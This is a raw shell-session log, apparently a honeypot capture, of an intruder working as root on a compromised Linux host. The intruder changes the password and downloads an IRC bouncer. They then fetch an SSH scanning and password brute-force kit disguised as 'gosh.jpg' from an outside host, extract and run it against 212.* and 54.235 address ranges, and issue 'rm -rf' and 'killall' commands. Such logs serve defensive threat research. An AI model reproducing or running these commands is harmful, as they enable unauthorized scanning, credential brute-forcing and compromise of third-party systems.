@@ -1,0 +1,798 @@
+[4hAWSWeb:~# free -m
+bash: free: command not found
+AWSWeb:~# xuname -a
+bash: xuname: command not found
+AWSWeb:~# help
+bash: help: command not found
+AWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# ssh -l root
+[4lusage: ssh [-1246AaCfgKkMNnqsTtVvXxY] [-b bind_address] [-c cipher_spec]
+           [-D [bind_address:]port] [-e escape_char] [-F configfile]
+           [-i identity_file] [-L [bind_address:]port:host:hostport]
+           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
+           [-R [bind_address:]port:host:hostport] [-S ctl_path]
+           [-w local_tun[:remote_tun]] [user@]hostname [command]
+[4hAWSWeb:~# [Kssh -l root sudo cpan install HTML::TagParser module
+[4lThe authenticity of host 'sudo (211.56.179.240)' can't be established.
+RSA key fingerprint is 9d:30:97:8a:9e:48:0d:de:04:8d:76:3a:7b:4b:30:f8.
+Are you sure you want to continue connecting (yes/no)? n
+Warning: Permanently added 'sudo' (RSA) to the list of known hosts.
+root@sudo's password: 
+
+Linux sudo 2.6.26-2-686 #1 SMP Wed Nov 4 20:45:37 UTC 2009 i686
+Last login: Sun Dec 15 04:14:56 2013 from 192.168.9.4
+[4hsudo:~# n
+bash: n: command not found
+sudo:~# n[1D[1Psudo cpan install HTML::TagParser module
+bash: sudo: command not found
+sudo:~# free -m
+bash: free: command not found
+sudo:~# killall -9 /usr/bin/python & killall -9 /usr/bin/perl
+bash: killall: command not found
+sudo:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hsudo:~# yum
+bash: yum: command not found
+sudo:~# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hsudo:~# /etc/init.d/httpd start
+bash: /etc/init.d/httpd: command not found
+sudo:~# /etc/init.d/apache2 start
+bash: /etc/init.d/apache2: command not found
+sudo:~# apachectl start
+bash: apachectl: command not found
+sudo:~# cat /etc/*-release
+[4lcat: /etc/*-release: No such file or directory
+[4hsudo:~#  lsb_release -a
+bash: lsb_release: command not found
+sudo:~# cat /proc/version
+[4lcat: /proc/version: No such file or directory
+[4hsudo:~# dmidecode --type 17
+bash: dmidecode: command not found
+sudo:~#  sudo dmidecode --type 17
+bash: sudo: command not found
+sudo:~# history
+[4l    1  free -m
+    2  xuname -a
+    3  help
+    4  id
+    5  ifconfig
+    6  passwd
+    7  ssh -l root
+    8  ssh -l root sudo cpan install HTML::TagParser module
+    9  n
+   10  sudo cpan install HTML::TagParser module
+   11  free -m
+   12  killall -9 /usr/bin/python & killall -9 /usr/bin/perl
+   13  ps x
+   14  yum
+   15  apt-get
+   16  /etc/init.d/httpd start
+   17  /etc/init.d/apache2 start
+   18  apachectl start
+   19  cat /etc/*-release
+   20   lsb_release -a
+   21  cat /proc/version
+   22  dmidecode --type 17
+   23   sudo dmidecode --type 17
+   24  history
+[4hsudo:~# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hsudo:~# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hsudo:~# wget http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
+[4l--2013-12-16 14:31:08--  http://www.psybnc.at/download/beta/psyBNC-2.3.2-7.tar.gz
+Connecting to www.psybnc.at:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 312177 (304K) [application/x-gzip]
+Saving to: `psyBNC-2.3.2-7.tar.gz
+
+ 0% [>                                      ] 1,178        2K/s  eta 1m 52s18% [=======>                               ] 56,202       60K/s  eta 4s   100%[======================================>] 312,177      60K/s
+
+2013-12-16 14:31:10 (60 KB/s) - `psyBNC-2.3.2-7.tar.gz' saved [312177/312177]
+[4hsudo:~# tar -zxvf psyBNC-2.3.2-7.tar.gz
+[4lpsybnc
+psybnc/src
+psybnc/src/p_memory.c
+psybnc/src/p_version.h
+psybnc/src/match.c
+psybnc/src/p_client.c
+psybnc/src/ssl.cnf
+psybnc/src/p_coredns.c
+psybnc/src/p_dcc.c
+psybnc/src/bsd-setenv.c
+psybnc/src/p_blowfish.c
+psybnc/src/p_crypt.c
+psybnc/src/p_data.h
+psybnc/src/p_global.h
+psybnc/src/p_hash.c
+psybnc/src/p_idea.c
+psybnc/src/p_inifunc.c
+psybnc/src/p_intnet.c
+psybnc/src/p_link.c
+psybnc/src/p_log.c
+psybnc/src/p_network.c
+psybnc/src/p_parse.c
+psybnc/src/p_peer.c
+psybnc/src/p_script.c
+psybnc/src/p_server.c
+psybnc/src/p_socket.c
+psybnc/src/p_string.c
+psybnc/src/p_sysmsg.c
+psybnc/src/p_topology.c
+psybnc/src/p_translate.c
+psybnc/src/p_uchannel.c
+psybnc/src/p_userfile.c
+psybnc/src/psybnc.c
+psybnc/src/snprintf.c
+psybnc/menuconf
+psybnc/menuconf/help
+psybnc/menuconf/help/h101.txt
+psybnc/menuconf/help/h102.txt
+psybnc/menuconf/help/h103.txt
+psybnc/menuconf/help/h104.txt
+psybnc/menuconf/help/h105.txt
+psybnc/menuconf/help/h106.txt
+psybnc/menuconf/help/h107.txt
+psybnc/menuconf/help/h201.txt
+psybnc/menuconf/help/h202.txt
+psybnc/menuconf/help/h203.txt
+psybnc/menuconf/help/h204.txt
+psybnc/menuconf/help/h205.txt
+psybnc/menuconf/help/h206.txt
+psybnc/menuconf/help/h207.txt
+psybnc/menuconf/help/h208.txt
+psybnc/menuconf/help/h209.txt
+psybnc/menuconf/help/h210.txt
+psybnc/menuconf/help/h211.txt
+psybnc/menuconf/help/h212.txt
+psybnc/menuconf/help/h213.txt
+psybnc/menuconf/help/h214.txt
+psybnc/menuconf/help/h215.txt
+psybnc/menuconf/help/h216.txt
+psybnc/menuconf/help/h217.txt
+psybnc/menuconf/help/h218.txt
+psybnc/menuconf/help/h219.txt
+psybnc/menuconf/help/h220.txt
+psybnc/menuconf/help/h221.txt
+psybnc/menuconf/help/h301.txt
+psybnc/menuconf/help/h302.txt
+psybnc/menuconf/help/h303.txt
+psybnc/menuconf/help/h304.txt
+psybnc/menuconf/help/h305.txt
+psybnc/menuconf/help/h306.txt
+psybnc/menuconf/help/h501.txt
+psybnc/menuconf/help/h502.txt
+psybnc/menuconf/help/h503.txt
+psybnc/menuconf/help/h504.txt
+psybnc/menuconf/help/h505.txt
+psybnc/menuconf/help/h601.txt
+psybnc/menuconf/help/h701.txt
+psybnc/menuconf/help/h702.txt
+psybnc/menuconf/help/h703.txt
+psybnc/menuconf/help/h704.txt
+psybnc/menuconf/help/h705.txt
+psybnc/menuconf/help/h706.txt
+psybnc/menuconf/help/h707.txt
+psybnc/menuconf/help/h708.txt
+psybnc/menuconf/help/h709.txt
+psybnc/menuconf/help/h710.txt
+psybnc/menuconf/help/h711.txt
+psybnc/menuconf/help/h712.txt
+psybnc/menuconf/help/h713.txt
+psybnc/menuconf/help/h714.txt
+psybnc/menuconf/help/h715.txt
+psybnc/menuconf/help/h716.txt
+psybnc/menuconf/dialog.h
+psybnc/menuconf/inifunc.c
+psybnc/menuconf/inputbox.c
+psybnc/menuconf/menubox.c
+psybnc/menuconf/menuconf.c
+psybnc/menuconf/textbox.c
+psybnc/menuconf/util.c
+psybnc/menuconf/checklist.c
+psybnc/menuconf/colors.h
+psybnc/help
+psybnc/help/DELNETWORK.ITA
+psybnc/help/ADDALLOW.DEU
+psybnc/help/ADDALLOW.ITA
+psybnc/help/ADDALLOW.TXT
+psybnc/help/ADDASK.DEU
+psybnc/help/ADDASK.ITA
+psybnc/help/ADDASK.TXT
+psybnc/help/ADDAUTOOP.DEU
+psybnc/help/ADDAUTOOP.ITA
+psybnc/help/ADDAUTOOP.TXT
+psybnc/help/ADDBAN.DEU
+psybnc/help/ADDBAN.ITA
+psybnc/help/ADDBAN.TXT
+psybnc/help/ADDDCC.DEU
+psybnc/help/ADDDCC.ITA
+psybnc/help/ADDDCC.TXT
+psybnc/help/ADDIGNORE.DEU
+psybnc/help/ADDIGNORE.ITA
+psybnc/help/ADDIGNORE.TXT
+psybnc/help/ADDLOG.DEU
+psybnc/help/ADDLOG.ITA
+psybnc/help/ADDLOG.TXT
+psybnc/help/ADDNETWORK.DEU
+psybnc/help/ADDNETWORK.ITA
+psybnc/help/ADDNETWORK.TXT
+psybnc/help/ADDOP.DEU
+psybnc/help/ADDOP.ITA
+psybnc/help/ADDOP.TXT
+psybnc/help/ADDSERVER.DEU
+psybnc/help/ADDSERVER.ITA
+psybnc/help/ADDSERVER.TXT
+psybnc/help/ADDUSER.DEU
+psybnc/help/ADDUSER.ITA
+psybnc/help/ADDUSER.TXT
+psybnc/help/AIDLE.DEU
+psybnc/help/AIDLE.ITA
+psybnc/help/AIDLE.TXT
+psybnc/help/AUTOGETDCC.DEU
+psybnc/help/AUTOGETDCC.ITA
+psybnc/help/AUTOGETDCC.TXT
+psybnc/help/AUTOREJOIN.DEU
+psybnc/help/AUTOREJOIN.ITA
+psybnc/help/AUTOREJOIN.TXT
+psybnc/help/BCONNECT.DEU
+psybnc/help/BCONNECT.ITA
+psybnc/help/BCONNECT.TXT
+psybnc/help/BHELP.DEU
+psybnc/help/BHELP.ITA
+psybnc/help/BHELP.TXT
+psybnc/help/BKILL.DEU
+psybnc/help/BKILL.ITA
+psybnc/help/BKILL.TXT
+psybnc/help/BQUIT.DEU
+psybnc/help/BQUIT.ITA
+psybnc/help/BQUIT.TXT
+psybnc/help/BREHASH.DEU
+psybnc/help/BREHASH.ITA
+psybnc/help/BREHASH.TXT
+psybnc/help/BVHOST.DEU
+psybnc/help/BVHOST.ITA
+psybnc/help/BVHOST.TXT
+psybnc/help/BWHO.DEU
+psybnc/help/BWHO.ITA
+psybnc/help/BWHO.TXT
+psybnc/help/DCCANSWER.DEU
+psybnc/help/DCCANSWER.ITA
+psybnc/help/DCCANSWER.TXT
+psybnc/help/DCCCANCEL.DEU
+psybnc/help/DCCCANCEL.ITA
+psybnc/help/DCCCANCEL.TXT
+psybnc/help/DCCCHAT.DEU
+psybnc/help/DCCCHAT.ITA
+psybnc/help/DCCCHAT.TXT
+psybnc/help/DCCENABLE.DEU
+psybnc/help/DCCENABLE.ITA
+psybnc/help/DCCENABLE.TXT
+psybnc/help/DCCGET.DEU
+psybnc/help/DCCGET.ITA
+psybnc/help/DCCGET.TXT
+psybnc/help/DCCSEND.DEU
+psybnc/help/DCCSEND.ITA
+psybnc/help/DCCSEND.TXT
+psybnc/help/DCCSENDME.DEU
+psybnc/help/DCCSENDME.ITA
+psybnc/help/DCCSENDME.TXT
+psybnc/help/DELALLOW.DEU
+psybnc/help/DELALLOW.ITA
+psybnc/help/DELALLOW.TXT
+psybnc/help/DELASK.DEU
+psybnc/help/DELASK.ITA
+psybnc/help/DELASK.TXT
+psybnc/help/DELAUTOOP.DEU
+psybnc/help/DELAUTOOP.ITA
+psybnc/help/DELAUTOOP.TXT
+psybnc/help/DELBAN.DEU
+psybnc/help/DELBAN.ITA
+psybnc/help/DELBAN.TXT
+psybnc/help/DELDCC.DEU
+psybnc/help/DELDCC.ITA
+psybnc/help/DELDCC.TXT
+psybnc/help/DELENCRYPT.DEU
+psybnc/help/DELENCRYPT.ITA
+psybnc/help/DELENCRYPT.TXT
+psybnc/help/DELIGNORE.DEU
+psybnc/help/DELIGNORE.ITA
+psybnc/help/DELIGNORE.TXT
+psybnc/help/DELLINK.DEU
+psybnc/help/DELLINK.ITA
+psybnc/help/DELLINK.TXT
+psybnc/help/DELLOG.DEU
+psybnc/help/DELLOG.ITA
+psybnc/help/DELLOG.TXT
+psybnc/help/DELNETWORK.DEU
+psybnc/help/LISTASK.TXT
+psybnc/help/DELNETWORK.TXT
+psybnc/help/DELOP.DEU
+psybnc/help/DELOP.ITA
+psybnc/help/DELOP.TXT
+psybnc/help/DELSERVER.DEU
+psybnc/help/DELSERVER.ITA
+psybnc/help/DELSERVER.TXT
+psybnc/help/DELTRANSLATE.DEU
+psybnc/help/DELTRANSLATE.ITA
+psybnc/help/DELTRANSLATE.TXT
+psybnc/help/DELUSER.DEU
+psybnc/help/DELUSER.ITA
+psybnc/help/DELUSER.TXT
+psybnc/help/ENCRYPT.DEU
+psybnc/help/ENCRYPT.ITA
+psybnc/help/ENCRYPT.TXT
+psybnc/help/ERASEMAINLOG.DEU
+psybnc/help/ERASEMAINLOG.ITA
+psybnc/help/ERASEMAINLOG.TXT
+psybnc/help/ERASEPRIVATELOG.DEU
+psybnc/help/ERASEPRIVATELOG.ITA
+psybnc/help/ERASEPRIVATELOG.TXT
+psybnc/help/ERASETRAFFICLOG.DEU
+psybnc/help/ERASETRAFFICLOG.ITA
+psybnc/help/ERASETRAFFICLOG.TXT
+psybnc/help/JUMP.DEU
+psybnc/help/JUMP.ITA
+psybnc/help/JUMP.TXT
+psybnc/help/LEAVEQUIT.DEU
+psybnc/help/LEAVEQUIT.ITA
+psybnc/help/LEAVEQUIT.TXT
+psybnc/help/LINKFROM.DEU
+psybnc/help/LINKFROM.ITA
+psybnc/help/LINKFROM.TXT
+psybnc/help/LINKTO.DEU
+psybnc/help/LINKTO.ITA
+psybnc/help/LINKTO.TXT
+psybnc/help/LISTALLOW.DEU
+psybnc/help/LISTALLOW.ITA
+psybnc/help/LISTALLOW.TXT
+psybnc/help/LISTASK.DEU
+psybnc/help/LISTASK.ITA
+psybnc/help/LISTAUTOOPS.DEU
+psybnc/help/LISTAUTOOPS.ITA
+psybnc/help/LISTAUTOOPS.TXT
+psybnc/help/LISTBANS.DEU
+psybnc/help/LISTBANS.ITA
+psybnc/help/LISTBANS.TXT
+psybnc/help/LISTDCC.DEU
+psybnc/help/LISTDCC.ITA
+psybnc/help/LISTDCC.TXT
+psybnc/help/LISTENCRYPT.DEU
+psybnc/help/LISTENCRYPT.ITA
+psybnc/help/LISTENCRYPT.TXT
+psybnc/help/LISTIGNORES.DEU
+psybnc/help/LISTIGNORES.ITA
+psybnc/help/LISTIGNORES.TXT
+psybnc/help/LISTLINKS.DEU
+psybnc/help/LISTLINKS.ITA
+psybnc/help/LISTLINKS.TXT
+psybnc/help/LISTLOGS.DEU
+psybnc/help/LISTLOGS.ITA
+psybnc/help/LISTLOGS.TXT
+psybnc/help/LISTOPS.DEU
+psybnc/help/LISTOPS.ITA
+psybnc/help/LISTOPS.TXT
+psybnc/help/LISTSERVERS.DEU
+psybnc/help/LISTSERVERS.ITA
+psybnc/help/LISTSERVERS.TXT
+psybnc/help/LISTTASKS.DEU
+psybnc/help/LISTTASKS.ITA
+psybnc/help/LISTTASKS.TXT
+psybnc/help/MADMIN.DEU
+psybnc/help/MADMIN.ITA
+psybnc/help/MADMIN.TXT
+psybnc/help/NAMEBOUNCER.DEU
+psybnc/help/NAMEBOUNCER.ITA
+psybnc/help/NAMEBOUNCER.TXT
+psybnc/help/PASSWORD.DEU
+psybnc/help/PASSWORD.ITA
+psybnc/help/PASSWORD.TXT
+psybnc/help/PLAYMAINLOG.DEU
+psybnc/help/PLAYMAINLOG.ITA
+psybnc/help/PLAYMAINLOG.TXT
+psybnc/help/PLAYPRIVATELOG.DEU
+psybnc/help/PROXY.DEU
+psybnc/help/PROXY.ITA
+psybnc/help/PLAYPRIVATELOG.ITA
+psybnc/help/PLAYPRIVATELOG.TXT
+psybnc/help/PLAYTRAFFICLOG.DEU
+psybnc/help/PLAYTRAFFICLOG.ITA
+psybnc/help/PLAYTRAFFICLOG.TXT
+psybnc/help/PROXY.TXT
+psybnc/help/RELAYLINK.DEU
+psybnc/help/RELAYLINK.ITA
+psybnc/help/RELAYLINK.TXT
+psybnc/help/RELINK.DEU
+psybnc/help/RELINK.ITA
+psybnc/help/RELINK.TXT
+psybnc/help/SETAWAY.DEU
+psybnc/help/SETAWAY.ITA
+psybnc/help/SETAWAY.TXT
+psybnc/help/SETAWAYNICK.DEU
+psybnc/help/SETAWAYNICK.ITA
+psybnc/help/SETAWAYNICK.TXT
+psybnc/help/SETLANG.DEU
+psybnc/help/SETLANG.ITA
+psybnc/help/SETLANG.TXT
+psybnc/help/SETLEAVEMSG.DEU
+psybnc/help/SETLEAVEMSG.ITA
+psybnc/help/SETLEAVEMSG.TXT
+psybnc/help/SETUSERNAME.DEU
+psybnc/help/SETUSERNAME.ITA
+psybnc/help/SETUSERNAME.TXT
+psybnc/help/SOCKSTAT.DEU
+psybnc/help/SOCKSTAT.ITA
+psybnc/help/SOCKSTAT.TXT
+psybnc/help/SRELOAD.DEU
+psybnc/help/SRELOAD.ITA
+psybnc/help/SRELOAD.TXT
+psybnc/help/SWITCHNET.DEU
+psybnc/help/SWITCHNET.ITA
+psybnc/help/SWITCHNET.TXT
+psybnc/help/TRANSLATE.DEU
+psybnc/help/TRANSLATE.ITA
+psybnc/help/TRANSLATE.TXT
+psybnc/help/UNADMIN.DEU
+psybnc/help/UNADMIN.ITA
+psybnc/help/UNADMIN.TXT
+psybnc/scripts
+psybnc/scripts/example
+psybnc/scripts/example/DEFAULT.SCRIPT
+psybnc/scripts/INFO
+psybnc/log
+psybnc/log/INFO
+psybnc/tools
+psybnc/tools/autoconf.c
+psybnc/tools/chkbind.c
+psybnc/tools/chkenv.c
+psybnc/tools/chkipv6.c
+psybnc/tools/chkresolv.c
+psybnc/tools/chksock.c
+psybnc/tools/chkssl.c
+psybnc/tools/chktime.c
+psybnc/tools/convconf.c
+psybnc/tools/makesalt.c
+psybnc/lang
+psybnc/lang/english.lng
+psybnc/lang/INFO
+psybnc/lang/german.lng
+psybnc/lang/italiano.lng
+psybnc/motd
+psybnc/motd/INFO
+psybnc/TODO
+psybnc/config.h
+psybnc/psybncchk
+psybnc/targets.mak
+psybnc/CHANGES
+psybnc/COPYING
+psybnc/FAQ
+psybnc/Makefile
+psybnc/README
+psybnc/SCRIPTING
+[4hsudo:~# cd psybnc
+[4l[4hsudo:~/psybnc# make menuconfig
+bash: make: command not found
+sudo:~/psybnc# apt[1D[1P[1D[1P[1D[1Pcv[1D[1P[1D[1Pc[1D[1Pcd
+[4l[4hsudo:~# ;ls[1D[1P[1D[1P[1D[1Pls
+[4lpsyBNC-2.3.2-7.tar.gz psybnc                
+[4hsudo:~# rm -t[1D[1Prf[1D[1Pd[1D[1Pf *
+[4l[4hsudo:~# wget http://X.hackersoft.org/scanner/gosh.jpg
+[4l--2013-12-16 14:32:08--  http://X.hackersoft.org/scanner/gosh.jpg
+Connecting to X.hackersoft.org:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1648667 (1M) [image/jpeg]
+Saving to: `gosh.jpg
+
+ 0% [>                                      ] 4,170        16K/s  eta 1m 38s44% [=================>                     ] 738,550      965K/s  eta 0s   100%[======================================>] 1,648,667    965K/s
+
+2013-12-16 14:32:09 (965 KB/s) - `gosh.jpg' saved [1648667/1648667]
+[4hsudo:~# wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+[4l--2013-12-16 14:32:26--  http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
+Connecting to download.microsoft.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 130978672 (124M) [application/octet-stream]
+Saving to: `W2Ksp3.exe
+
+ 0% [>                                      ] 1,151        44K/s  eta 49m 33s 7% [==>                                    ] 9,445,510    17089K/s  eta 7s   8% [===>                                   ] 10,588,205   10031K/s  eta 12s 9% [===>                                   ] 11,810,541   7445K/s  eta 16s  9% [===>                                   ] 12,901,109   6086K/s  eta 19s10% [====>                                  ] 14,281,277   5356K/s  eta 21s11% [====>                                  ] 15,510,965   4859K/s  eta 23s^C
+200 OK
+[4hsudo:~# 
+sudo:~# tar zxvf gosh.jpg
+[4lgosh
+gosh/ssh-scan
+gosh/go.sh
+gosh/gen-pass.sh
+gosh/1
+gosh/3
+gosh/ss
+gosh/pscan2
+gosh/a
+gosh/pass_file
+gosh/4
+gosh/common
+gosh/scam
+gosh/2
+gosh/secure
+gosh/gcc.c
+gosh/5
+[4hsudo:~# ls
+[4lgosh.jpg gosh     
+[4hsudo:~# cd gosh
+[4l[4hsudo:~/gosh# ls
+[4lssh-scan    go.sh       gen-pass.sh 1           3           ss          
+pscan2      a           pass_file   4           common      scam        
+2           secure      gcc.c       5           
+[4hsudo:~/gosh# rm -rf gcc.c
+[4l[4hsudo:~/gosh# ls
+[4lssh-scan    go.sh       gen-pass.sh 1           3           ss          
+pscan2      a           pass_file   4           common      scam        
+2           secure      5           
+[4hsudo:~/gosh# chmod +X[1D[1Px *
+[4l[4hsudo:~/gosh# ./go.sh 212
+[4lscanning network 212.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hsudo:~/gosh# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# ifconfig eth0:0  54.235.161.133 up
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# [Kifconfig[8D[Kifconfig eth0:0  54.235.161.133 up[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1C[1D[1P
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# [Kifconfig eth0:0 54.235.161.133 up[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1P[1D[1P[1D[1P1
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hsudo:~/gosh# .s[1D[1P[1D[1Pls
+[4lssh-scan    go.sh       gen-pass.sh 1           3           ss          
+pscan2      a           pass_file   4           common      scam        
+2           secure      5           
+[4hsudo:~/gosh# ./a
+[4l usage: ./a <b class>
+[4hsudo:~/gosh# [K./a 54.235
